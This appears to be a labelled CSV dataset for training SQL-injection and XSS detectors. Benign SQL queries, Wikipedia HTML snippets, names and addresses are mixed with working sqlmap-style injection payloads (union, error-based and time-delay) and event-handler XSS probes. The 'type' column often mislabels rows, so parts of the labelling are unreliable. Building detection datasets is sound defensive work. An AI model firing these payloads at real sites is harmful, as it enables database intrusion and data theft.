Text,Label,type
SELECT AVG ( Price ) FROM angry,0,sql
"-9718%""  )   union all select 9515,9515,9515#",1,sql
SELECT currency_code FROM wp_houzez_currencies,0,sql
"<plaintext onmouseenter=""alert(1)"">test</plaintext>",2,xss
"1%'   )    )    union all select null,null,null,null,null,null,null,null,null,null--",1,sql
" select * from users where id  =  '1' union select \,@@VERSION -- 1'",1,sql
SELECT MIN ( manner )  AS harder FROM base,0,sql
"   SELECT COUNT ( slide ) , question FROM limited BY airplane",0,sql
8.366E+15,0,sql
"1""  )   as ipxg where 4031  =  4031 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  --",1,sql
SELECT * FROM satellites WHERE comfortable NOT LIKE '[tone]%',0,sql
"1   )    )     )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (     (  4127  =  4127",1,xss
"	 </span> <span class=""reference-text""><cite class=""citation web""><a rel=""nofollow"" class=""external text"" href=""https://www.vox.com/2014/8/22/6043635/5-reasons-we-shouldnt-worry-about-super-intelligent-computers-taking"">""Will artificial intelligence destroy humanity? Here are 5 reasons not to worry"" </a>. <i>Vox </i>. 22 August 2014. <a rel=""nofollow"" class=""external text"" href=""https://web.archive.org/web/20151030092203/http://www.vox.com/2014/8/22/6043635/5-reasons-we-shouldnt-worry-about-super-intelligent-computers-taking"">Archived </a> from the original on 30 October 2015<span class=""reference-accessdate"">. Retrieved <span class=""nowrap"">30 October ",0,xss
"<ruby onkeydown=""alert(1)"" contenteditable>test</ruby>",2,xss
"   SELECT again, final, never FROM disease WHERE fat  IS NULL",0,sql
"  SELECT frontID AS ID, command AS rapidly FROM everything",0,sql
"1' in boolean mode  )   union all select null,null,null,null--",1,sql
" SELECT * FROM area ORDER BY burn, general",0,sql
 (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  'pags'  =  'pags,1,xss
"1' in boolean mode  )   union all select null,null,null--",1,xss
PRINT @@variable,1,sql
"1 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   ",1,sql
"<li id=""cite_note-118""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-118"">^ </a> </b> ",0,xss
SELECT * FROM Users WHERE UserId  =  105 OR 1 = 1;,0,sql
1 and user_name  (    )     =   'dbo',1,sql
graciliano,0,sql
"<ruby onmouseenter=""alert(1)"">test</ruby>",2,xss
"-1985%'   )    )     )   union all select 3051,3051,3051--",1,xss
<img src=x:alert(alt) onerror=eval(src) alt=0>,2,xss
"	 </span> <span class=""reference-text""><cite class=""citation news"">Hutson, Matthew (16 February 2018). <a rel=""nofollow"" class=""external text"" href=""http://science.sciencemag.org/content/359/6377/725"">""Artificial intelligence faces reproducibility crisis"" </a>. <i><a href=""/wiki/Science_Magazine"" class=""mw-redirect"" title=""Science Magazine"">Science </a> </i>. pp.&#160;725–726. <a href=""/wiki/Bibcode"" title=""Bibcode"">Bibcode </a>:<a rel=""nofollow"" class=""external text"" href=""https://ui.adsabs.harvard.edu/abs/2018Sci...359..725H"">2018Sci...359..725H </a>. <a href=""/wiki/Digital_object_identifier"" title=""Digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.1126%2Fscience.359.6377.725"">10.1126/science.359.6377.725 </a><span class=""reference-accessdate"">. Retrieved <span class=""nowrap"">28 April ",0,xss
"c/ arbitro eduardo vidal torres, 12, 4c",0,sql
SELECT rush ( s )  FROM gold LEFT JOIN,0,sql
"<li><a href=""/wiki/Robot_competition"" title=""Robot competition"">Competitions </a> </li>",0,xss
"   SELECT Employees.brass, COUNT ( Orders.importantID )  AS powderFROM    ( OrdersINNER JOIN lonely ON Orders.wayID  =  Employees.definitionID ) ",0,sql
"	 </span><a href=""/w/index.php?title=Artificial_intelligence&amp;action=edit&amp;section=18"" title=""Edit section: Logic-based"">edit </a><span class=""mw-editsection-bracket"">] ",0,xss
SELECT prepare ( s FROM shade RIGHT JOIN,0,sql
"   SELECT Employees.fact, COUNT ( Orders.studyingID )  AS ponyFROM    ( OrdersINNER JOIN studied ON Orders.resultID  =  Employees.vastID ) ",0,xss
DELETE FROM tail,0,xss
"-9613""   )    )     )   or elt  (  3125  =  7084,7084  )   and    (    (     (  ""pupl""  =  ""pupl",1,sql
"<div draggable=""true"" contenteditable>drag me</div><form ondrop=alert(1) contenteditable>drop here</form>",2,xss
SELECT * FROM  ( SELECT together FROM here ) ,0,sql
ten.tar,0,sql
SELECT TOP 50 PERCENT * FROM sense,0,sql
21292,0,sql
SELECT * FROM port WHERE sent = 'root'  AND  ( laid = 'rays' OR point = 'against' ) ,0,sql
<hgroup onpointerout=alert(1)>XSS</hgroup>,2,xss
"1""  )   where 9285  =  9285 and 8506  =  8343#",1,sql
A few of the people who make some form of the argument:,0,xss
SELECT AVG ( upon )  FROM farm  SELECT SUM ( dust ) ,0,xss
"<ul><li><a href=""/wiki/Evolutionary_robotics"" title=""Evolutionary robotics"">Evolutionary </a> </li>",0,xss
hoog,0,sql
<rtc id=x tabindex=1 onbeforeactivate=alert(1)></rtc>,2,xss
olite,0,sql
SELECT * FROM  ( SELECT proper FROM becoming ) ,0,sql
"-4015"" where 2610  =  2610 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1,sql
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and   (  ""eboa"" like ""eboa",1,sql
"<style>:target {transform: rotate(180deg);}</style><audio id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></audio>",2,xss
-1188   )    )    union all select 4711--,1,sql
SELECT COUNT ( DISTINCT cattle )  FROM coach,0,sql
SELECT * FROM forgotten  WHERE needs NOT LIKE '[creature]%',0,sql
beaule,0,sql
-4248 where 3288  =  3288 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --,1,sql
<div id=x tabindex=1 onfocus=alert(1)></div>,2,xss
 </li>,0,xss
"  SELECT stuck,boy FROM owner WHERE try = 'quick' UNION SELECT missing, strength FROM gather",0,sql
"   SELECT highest, grandmother+ ', ' + beat+ ' ' + pole+ ', ' + shop AS castle  FROM verb",0,sql
-8023' in boolean mode  )   order by 1#,1,xss
cebuano,0,xss
-9014' order by 1--,1,xss
SELECT year FROM sand,0,sql
" or 0  =  0 #""",1,sql
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and 'kiex'  =  'kiex",1,sql
"<li><a href=""/wiki/Bees_algorithm"" title=""Bees algorithm"">Bees algorithm </a> </li>",0,xss
" </div>  <div id=""left-navigation"">",0,xss
SELECT * FROM lion FETCH FIRST 3 ROWS ONLY,0,sql
 (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4501  =  4501  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  ) ,1,sql
SELECT * FROM angry FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM search,0,sql
-6567'   )    )    union all select 3217#,1,xss
"1 where 8114  =  8114 and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,sql
 ,0,xss
"-7122""  )   union all select 4002,4002,4002,4002,4002,4002,4002,4002#",1,sql
"fernandez latorre 14,",0,sql
"1""  )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  ""cmhh"" like ""cmhh",1,xss
"<li><cite class=""citation book""><a href=""/wiki/Richard_Neapolitan"" title=""Richard Neapolitan"">Neapolitan, Richard </a>; Jiang, Xia (2018). <a rel=""nofollow"" class=""external text"" href=""https://www.crcpress.com/Contemporary-Artificial-Intelligence-Second-Edition/Neapolitan-Jiang/p/book/9781138502383""><i>Artificial Intelligence: With an Introduction to Machine Learning </i> </a>. Chapman &amp; Hall/CRC. <a href=""/wiki/International_Standard_Book_Number"" title=""International Standard Book Number"">ISBN </a>&#160;<a href=""/wiki/Special:BookSources/978-1-138-50238-3"" title=""Special:BookSources/978-1-138-50238-3""><bdi>978-1-138-50238-3 </bdi> </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=book&amp;rft.btitle=Artificial+Intelligence%3A+With+an+Introduction+to+Machine+Learning&amp;rft.pub=Chapman+%26+Hall%2FCRC&amp;rft.date=2018&amp;rft.isbn=978-1-138-50238-3&amp;rft.aulast=Neapolitan&amp;rft.aufirst=Richard&amp;rft.au=Jiang%2C+Xia&amp;rft_id=https%3A%2F%2Fwww.crcpress.com%2FContemporary-Artificial-Intelligence-Second-Edition%2FNeapolitan-Jiang%2Fp%2Fbook%2F9781138502383&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
p5r0i9i5ar,0,sql
"<p draggable=""true"" ondragenter=""alert(1)"">test</p>",2,xss
"Definition of AI as the study of <a href=""/wiki/Intelligent_agents"" class=""mw-redirect"" title=""Intelligent agents"">intelligent agents </a>:",0,xss
29385081m,0,sql
"<a href=""/wiki/Intractably"" class=""mw-redirect"" title=""Intractably"">Intractability and efficiency </a> and the <a href=""/wiki/Combinatorial_explosion"" title=""Combinatorial explosion"">combinatorial explosion </a>:",0,xss
SELECT AVG ( experiment ) FROM remain SELECT SUM ( apartment ) ,0,sql
"1%""   )    )     )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (     (  ""%""  =  """,1,sql
SELECT * FROM turn WHERE massage = 'western'  AND  ( troops = 'everyone' OR women = 'expression' ) ,0,sql
"<li><a href=""#CITEREFCrevier1993"">Crevier 1993 </a> </li> </ul>",0,xss
espuna angullo,0,sql
"1""   )    )    as nlgn where 3834  =  3834 and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,sql
hi' or 1  =  1 --,1,sql
SELECT * FROM spoken WHERE price = 'are' LIMIT 3,0,sql
"1' and make_set  (  4952  =  7129,7129  )  ",1,sql
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 189 )  ORDER BY meta_id ASC",0,sql
1 where 1519  =  1519,1,sql
<code id=x tabindex=1 onbeforeactivate=alert(1)></code>,2,xss
"<multicol draggable=""true"" ondragleave=""alert(1)"">test</multicol>",2,xss
"1%'  )   or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and   (  '%'  =  '",1,sql
"<figure onbeforecopy=""alert(1)"" contenteditable>test</figure>",2,xss
"select * from generate_series  (  9434,9434,case when   (  9434  =  3991  )   then 1 else 0 end  )   limit 1--",1,sql
"SELECT * FROM until WHERE been BETWEEN ""private"" AND    ""piece""",0,sql
"concordia, 102,",0,sql
"<code onbeforecut=""alert(1)"" contenteditable>test</code>",2,xss
"  UPDATE dinner SET correctly =  'smoke', City =  'closer' WHERE action =  wash",0,sql
"1""  )   as cnrh where 8524  =  8524 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --",1,xss
godiva,0,xss
9285,0,sql
"	 <a href=""/wiki/Moravec%27s_paradox"" title=""Moravec&#39;s paradox"">Moravec's paradox </a> generalizes that low-level sensorimotor skills that humans take for granted are, counterintuitively, difficult to program into a robot; the paradox is named after ",0,xss
"1"" and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and ""nzgn""  =  ""nzgn",1,sql
"<li id=""cite_note-184""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-184"">^ </a> </b> ",0,xss
1'||  (  select 'bsbv' from dual where 5276  =  5276 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu   )    )   ||',1,sql
6.1643E+15,0,sql
SELECT accurate ( s )  FROM huge FULL OUTER JOIN,0,sql
"-1859' union all select 1781,1781,1781,1781#",1,xss
"1' and elt  (  3247  =  3969,3969  )   and 'xcbm' like 'xcbm",1,sql
SELECT * FROM final  WHERE salmon NOT LIKE '[ship]%',0,sql
SELECT * FROM finally WHERE silk = 'six'  OR jet = 'rhyme',0,sql
<img2 onpointerleave=alert(1)>XSS</img2>,2,xss
35936056m,0,xss
SELECT COUNT ( DISTINCT program )  FROM reason,0,sql
3046,0,sql
SELECT stomach ( s FROM football RIGHT JOIN,0,sql
"<li><cite id=""CITEREFBuchanan2005"" class=""citation journal"">Buchanan, Bruce G. (2005). <a rel=""nofollow"" class=""external text"" href=""https://web.archive.org/web/20070926023314/http://www.aaai.org/AITopics/assets/PDF/AIMag26-04-016.pdf"">""A (Very) Brief History of Artificial Intelligence"" </a> <span class=""cs1-format"">(PDF) ",0,xss
" SELECT column_name ( s )  FROM chapter,west",0,sql
"<li><a href=""/wiki/Eliminative_materialism"" title=""Eliminative materialism"">Eliminative materialism </a> </li>",0,xss
SELECT orange ( s )  FROM wing UNION ALL,0,sql
"  SELECT LEAST ( ""w3Schools.com"", ""microsoft.com"", ""apple.com"" ) ;",0,sql
"1""   )    )    and elt  (  3785  =  9386,9386  )   and    (    (   ""inwa"" like ""inwa",1,sql
calabazas de fuentiduea,0,sql
<hr onpointerleave=alert(1)>XSS</hr>,2,xss
"  SELECT * FROM here WHERE seven NOT IN  ( 'mine', 'origin', 'future' )  ",0,sql
 </div>,0,xss
"<frame draggable=""true"" ondragstart=""alert(1)"">test</frame>",2,xss
SELECT AVG ( outside ) FROM combine,0,sql
"   SELECT thick, doctor+ ', ' + creature+ ' ' + these+ ', ' + balance AS list  FROM wool",0,xss
<svg><meta onload=alert(1)></meta>,2,xss
"<div role=""note"" class=""hatnote navigation-not-searchable"">Main articles: <a href=""/wiki/Logic_programming"" title=""Logic programming"">Logic programming </a> and <a href=""/wiki/Automated_reasoning"" title=""Automated reasoning"">Automated reasoning </a> </div>",0,xss
"-2254'  )   as dyrv where 9079  =  9079 union all select 9079,9079,9079,9079,9079,9079,9079,9079#",1,sql
 UPDATE Customers SET ContactName = 'Juan'WHERE Country = 'Mexico';,0,xss
SELECT * FROM line WHERE map = 'connected' FETCH FIRST 3 ROWS ONLY,0,sql
"<li><a href=""/wiki/Computational_chemistry"" title=""Computational chemistry"">Computational chemistry </a> </li>",0,xss
SELECT AVG ( notice ) FROM sets,0,sql
"   SELECT sides, sort, rose FROM came WHERE eye  IS NULL",0,sql
"<li><a href=""/wiki/Igor_Aleksander"" title=""Igor Aleksander"">Igor Aleksander </a> </li>",0,xss
"-4176'+  (  select 'muio' where 4256  =  4256 union all select 4256,4256,4256,4256,4256,4256#",1,sql
"<li id=""cite_note-402""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-402"">^ </a> </b> ",0,xss
"   SELECT produce,wild,nearly,necessary,when     (  (  statement JOIN himself ON found.voice =  that.poem )   INNER JOIN sweptON Orders.college =  if.creamID ) ",0,xss
"<li><a href=""/wiki/Existential_risk_from_artificial_general_intelligence"" title=""Existential risk from artificial general intelligence"">Existential risk </a> </li>",0,xss
SELECT * FROM anywhere WHERE hurt = 'under' FETCH FIRST 3 ROWS ONLY,0,sql
"<li><cite id=""CITEREFGödel1951"" class=""citation conference""><a href=""/wiki/Kurt_G%C3%B6del"" title=""Kurt Gödel"">Gödel, Kurt </a> (1951). <i>Some basic theorems on the foundations of mathematics and their implications </i>. Gibbs Lecture. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=conference&amp;rft.btitle=Some+basic+theorems+on+the+foundations+of+mathematics+and+their+implications&amp;rft.date=1951&amp;rft.aulast=G%C3%B6del&amp;rft.aufirst=Kurt&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
SELECT * FROM noted FETCH FIRST 50 PERCENT ROWS ONLY,0,sql
SELECT major FROM space UNION SELECT design FROM peace ORDER BY south,0,xss
9.47299E+15,0,sql
select pg_sleep  (  5  )  #,1,sql
9043,0,sql
c/ javea 57,0,xss
fernn caballero,0,sql
"   SELECT jet, tide, weak FROM park WHERE short  IS NULL",0,sql
tomi,0,sql
"-6123"" or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and ""zuzx""  =  ""zuzx",1,sql
"   SELECT COUNT ( guess ) , shall FROM measure BY tobacco",0,sql
	 </span></a></dt><dd>Understand the Scrapy architecture.</dd>,0,xss
"  UPDATE bean SET well =  'replied', City =  'gain' WHERE mathematics =  twice",0,sql
<ul onpointerover=alert(1)>XSS</ul>,2,xss
17120,0,xss
"<details onpaste=""alert(1)"" contenteditable>test</details>",2,xss
"1""   )    )    union all select null,null,null,null,null#",1,sql
"	 </span> </a> </i>&#93; </sup> These networks are trained one layer at a time. Ivakhnenko's 1971 paper<sup id=""cite_ref-ivak1971_253-0"" class=""reference""><a href=""#cite_note-ivak1971-253"">&#91;242&#93; </a> </sup> describes the learning of a deep feedforward multilayer perceptron with eight layers, already much deeper than many later networks. In 2006, a publication by <a href=""/wiki/Geoffrey_Hinton"" title=""Geoffrey Hinton"">Geoffrey Hinton </a> and Ruslan Salakhutdinov introduced another way of pre-training many-layered <a href=""/wiki/Feedforward_neural_network"" title=""Feedforward neural network"">feedforward neural networks </a> (FNNs) one layer at a time, treating each layer in turn as an <a href=""/wiki/Unsupervised_learning"" title=""Unsupervised learning"">unsupervised </a> <a href=""/wiki/Restricted_Boltzmann_machine"" title=""Restricted Boltzmann machine"">restricted Boltzmann machine </a>, then using <a href=""/wiki/Supervised_learning"" title=""Supervised learning"">supervised </a> <a href=""/wiki/Backpropagation"" title=""Backpropagation"">backpropagation </a> for fine-tuning.<sup id=""cite_ref-FOOTNOTEHinton2007_254-0"" class=""reference""><a href=""#cite_note-FOOTNOTEHinton2007-254"">&#91;243&#93; </a> </sup> Similar to shallow artificial neural networks, deep neural networks can model complex non-linear relationships. Over the last few years, advances in both machine learning algorithms and computer hardware have led to more efficient methods for training deep neural networks that contain many layers of non-linear hidden units and a very large output layer.<sup id=""cite_ref-255"" class=""reference""><a href=""#cite_note-255"">&#91;244&#93; </a> </sup>",0,xss
13421536r,0,sql
	 </span> </h4>,0,xss
-3881   )    )     )   union all select 4438--,1,sql
"c/ pedro guezala 192, 6?a",0,xss
koontz,0,sql
rodo de la cerda,0,xss
"<style>:target {transform: rotate(180deg);}</style><blockquote id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></blockquote>",2,xss
SELECT COUNT ( plateID ) FROM deer,0,sql
"1""   )    )    union all select null,null,null,null,null,null,null,null,null,null--",1,sql
"c/ de puigcerda s/n, 1-g",0,xss
"<li id=""cite_note-Fuzzy_logic-201""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-Fuzzy_logic_201-0"">^ </a> </b> ",0,xss
" select * from users where id  =  1 -@<@ union select 1,version  (    )   -- 1",1,sql
"1%""  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1,sql
<blink onpointerup=alert(1)>XSS</blink>,2,xss
"   SELECT Shippers.ShipperName, COUNT ( Orders.OrderID )  AS NumberOfOrders FROM    OrdersLEFT JOIN Shippers ON Orders.ShipperID  =  Shippers.ShipperID  GROUP BY ShipperName;",0,sql
SELECT * FROM play,0,sql
SELECT were ( s ) FROM snake INNER JOIN,0,xss
"<strong onbeforepaste=""alert(1)"" contenteditable>test</strong>",2,xss
 </li>,0,xss
"<li><a href=""/wiki/Tabula_rasa"" title=""Tabula rasa"">Tabula rasa </a> </li>",0,xss
"<progress onmouseup=""alert(1)"">test</progress>",2,xss
SELECT COUNT ( grandmother ) FROM has,0,sql
"<link onmouseup=""alert(1)"">test</link>",2,xss
1320,0,sql
"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'ynpr'  =  'ynpr",1,sql
r92e1*56e,0,sql
-2891 where 1770  =  1770 or 9290  =  5866,1,xss
"select * from generate_series  (  1431,1431,case when   (  1431  =  7822  )   then 1 else 0 end  )   limit 1--",1,sql
"<li><a href=""/wiki/Phenomenology_(philosophy)"" title=""Phenomenology (philosophy)"">Phenomenology </a> </li>",0,xss
fickes,0,xss
SELECT MIN ( instant )  AS interior FROM monkey,0,sql
"1""  )   as nyzd where 5305  =  5305",1,sql
"<li><a href=""/wiki/Software_configuration_management"" title=""Software configuration management"">Software configuration management </a> </li>",0,xss
"<li><a href=""/wiki/Green_computing"" title=""Green computing"">Energy consumption (Green computing) </a> </li>",0,xss
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><acronym id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></acronym>",2,xss
SELECT AVG ( Price ) FROM respect,0,xss
"1 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  # kfza",1,sql
"-9057""  )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1,sql
"1' in boolean mode  )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  #",1,sql
"<li><a href=""/wiki/Phenomenalism"" title=""Phenomenalism"">Phenomenalism </a> </li>",0,xss
46593,0,sql
"1 union all select 1,2,3,4,5,6,name from sysobjects where xtype   =   'u' --",1,sql
euzaine@schnapps.com.gs,0,sql
"1""  )   as drrx where 8633  =  8633 union all select null,null,null--",1,sql
e41t8r,0,sql
gourley,0,xss
<dt id=x tabindex=1 onbeforedeactivate=alert(1)></dt><input autofocus>,2,xss
"<colgroup onmousedown=""alert(1)"">test</colgroup>",2,xss
<rt id=x tabindex=1 onfocus=alert(1)></rt>,2,xss
paseo arco del ladrillo 48 10?h,0,sql
SELECT * FROM island FETCH FIRST 50 PERCENT ROWS ONLY,0,sql
select   (  case when   (  8331  =  5625  )   then 8331 else 8331*  (  select 8331 from mysql.db  )   end  )  #,1,sql
"   SELECT COUNT ( motor ) , brick FROM press BY outline",0,sql
"1""   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   ""tbdl"" like ""tbdl",1,sql
"1 where 7362  =  7362 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,sql
"-5798"" or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",1,sql
SELECT * FROM sun  WHERE me NOT LIKE '[mental]%',0,sql
<dialog id=x tabindex=1 onfocus=alert(1)></dialog>,2,xss
"-6505'   )    )    as jtnp where 1037  =  1037 or elt  (  1032  =  1032,3623  )  --",1,xss
"<section onclick=""alert(1)"">test</section>",2,xss
" select * from users where id  =  1 or ""]."" or 1  =  1 -- 1",1,xss
select   (  case when   (  6276  =  6276  )   then 6276 else 6276*  (  select 6276 from information_schema.character_sets  )   end  )  #,1,sql
SELECT * FROM  ( SELECT quiet FROM perfect ) ,0,xss
"1'   )    )    union all select null,null,null,null,null,null,null,null--",1,sql
SELECT quietly FROM where UNION ALL SELECT short FROM went ORDER BY caught,0,sql
"<address draggable=""true"" ondragstart=""alert(1)"">test</address>",2,xss
andara francino,0,xss
77711232m,0,sql
<canvas onpointerover=alert(1)>XSS</canvas>,2,xss
"1'  )   where 8835  =  8835 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,sql
"1%'   )    )     )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (     (  '%'  =  '",1,sql
"1   )    )     )   union all select null,null,null,null,null,null,null,null#",1,sql
78260205z,0,sql
montiel@sitienesunawebtienesunnegocio.cf,0,sql
enanzar,0,sql
thorpe,0,sql
"	 </span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=The+Guardian&amp;rft.atitle=What+jobs+will+still+be+around+in+20+years%3F+Read+this+to+prepare+your+future&amp;rft.date=2017-06-26&amp;rft.aulast=Mahdawi&amp;rft.aufirst=Arwa&amp;rft_id=https%3A%2F%2Fwww.theguardian.com%2Fus-news%2F2017%2Fjun%2F26%2Fjobs-future-automation-robots-skills-creative-health&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
"<a href=""/wiki/Decision_theory"" title=""Decision theory"">decision theory </a> and <a href=""/wiki/Decision_analysis"" title=""Decision analysis"">decision analysis </a>:",0,xss
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT COUNT  (  DISTINCT  (  GRANTED_ROLE   )    )    FROM DBA_ROLE_PRIVS WHERE GRANTEE  =  SYS.LOGIN_USER   )    )    AND 'i'  =  'i,1,sql
6rce8o,0,sql
<dt onblur=alert(1) tabindex=1 id=x></dt><input autofocus>,2,xss
"<li id=""cite_note-FOOTNOTE&#39;&#39;CNN&#39;&#39;2006-291""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-FOOTNOTE&#39;&#39;CNN&#39;&#39;2006_291-0"">^ </a> </b> ",0,xss
"<track draggable=""true"" ondrag=""alert(1)"">test</track>",2,xss
